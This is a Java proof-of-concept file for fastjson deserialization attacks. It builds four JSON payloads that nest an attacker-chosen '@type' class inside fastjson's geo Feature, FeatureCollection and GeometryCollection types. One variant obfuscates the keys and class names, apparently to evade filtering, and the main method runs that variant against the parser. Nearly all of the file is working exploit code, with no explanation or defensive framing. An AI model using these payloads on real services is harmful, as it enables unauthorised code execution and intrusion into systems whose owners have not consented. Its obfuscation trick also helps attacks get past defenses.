public class geojson {
    private static String poc0 = "{\n" +
            "  \"@type\":\"com.alibaba.fastjson.support.geo.Feature\",\n" +
            "  \"properties\":{\n" +
            "    \"@type\":\"" + common.type() + "\",\n" +
            "    \"x\":1\n" +
            "  }\n" +
            "}";

    private static String poc1 = "{\n" +
            "  \"@type\": \"com.alibaba.fastjson.support.geo.FeatureCollection\",\n" +
            "  \"features\": [\n" +
            "    {\n" +
            "      \"properties\": {\n" +
            "        \"@type\":\"" + common.type() + "\",\n" +
            "        \"x\": 1\n" +
            "      }\n" +
            "    }\n" +
            "  ]\n" +
            "}";

    private static String poc2 = "{\n" +
            "  \"@type\": \"com.alibaba.fastjson.support.geo.GeometryCollection\",\n" +
            "  \"geometries\": [\n" +
            "    {\n" +
            "      \"@type\": \"com.alibaba.fastjson.support.geo.Feature\",\n" +
            "      \"properties\": {\n" +
            "        \"@type\":\"" + common.type() + "\",\n" +
            "        \"x\": 1\n" +
            "      }\n" +
            "    }\n" +
            "  ]\n" +
            "}";

    private static String poc3 = "{\n" +
            "  \"" + common.ghost("@type") + "\":\"" + common.ghost("com.alibaba.fastjson.support.geo.Feature") + "\",\n" +
            "  \"properties\":{\n" +
            "    \"" + common.ghost("@type") + "\":\"" + common.ghost(common.type()) + "\",\n" +
            "    \"x\":1\n" +
            "  }\n" +
            "}";

    public static void main(String[] args) throws Exception {
        System.out.printf(poc3);
        common.run(poc3, geojson.class);
    }
}
